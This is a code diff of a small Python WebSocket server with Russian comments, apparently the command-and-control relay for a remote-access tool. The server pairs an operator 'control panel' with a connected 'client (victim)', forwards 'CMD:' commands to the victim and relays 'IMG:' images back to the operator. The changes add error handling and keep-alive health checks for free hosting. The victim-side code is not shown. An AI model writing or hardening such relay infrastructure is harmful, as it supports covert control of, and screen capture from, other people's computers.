@@ -5,7 +5,8 @@ from aiohttp import web
 client_ws = None
 control_ws = None
 
-# --- HTTP-заглушка для UptimeRobot ---
+# --- HTTP-заглушка для UptimeRobot и Render ---
+# Отвечает на GET и автоматически на HEAD запросы
 async def health_check(request):
     return web.Response(text="OK", status=200)
 
@@ -25,26 +26,34 @@ async def websocket_handler(request):
                     control_ws = ws
                     print("Пульт управления подключен")
                     if client_ws:
-                        await control_ws.send_str("CLIENT_CONNECTED")
+                        try:
+                            await control_ws.send_str("CLIENT_CONNECTED")
+                        except Exception:
+                            pass
                 elif message == "CLIENT":
                     client_ws = ws
                     print("Клиент (жертва) подключен")
                     if control_ws:
-                        await control_ws.send_str("CLIENT_CONNECTED")
+                        try:
+                            await control_ws.send_str("CLIENT_CONNECTED")
+                        except Exception:
+                            pass
                 elif message.startswith("IMG:"):
                     if control_ws:
                         try:
                             await control_ws.send_str(message)
-                        except:
+                        except Exception:
                             control_ws = None
                 elif message.startswith("CMD:"):
                     if client_ws:
                         try:
                             await client_ws.send_str(message)
-                        except:
+                        except Exception:
                             client_ws = None
             elif msg.type == web.WSMsgType.ERROR:
                 print(f'Ошибка WebSocket: {ws.exception()}')
+    except Exception as e:
+        print(f"Ошибка соединения: {e}")
     finally:
         print("Соединение закрыто")
         if ws == client_ws:
@@ -58,14 +67,13 @@ async def websocket_handler(request):
 if __name__ == "__main__":
     app = web.Application()
     
-    # Обработчик WebSocket
+    # Обработчик WebSocket (клиенты подключаются по адресу /ws)
     app.router.add_get('/ws', websocket_handler)
     
-    # Обработчик проверки здоровья (для UptimeRobot и Render)
+    # Обработчик проверки здоровья для UptimeRobot (без дублирования HEAD)
     app.router.add_get('/', health_check)
-    app.router.add_head('/', health_check)
 
-    # Получаем порт от Render
+    # Получаем порт от Render (по умолчанию 10000)
     port = int(os.environ.get("PORT", 10000))
     print(f"Сервер запущен на порту {port}")
     
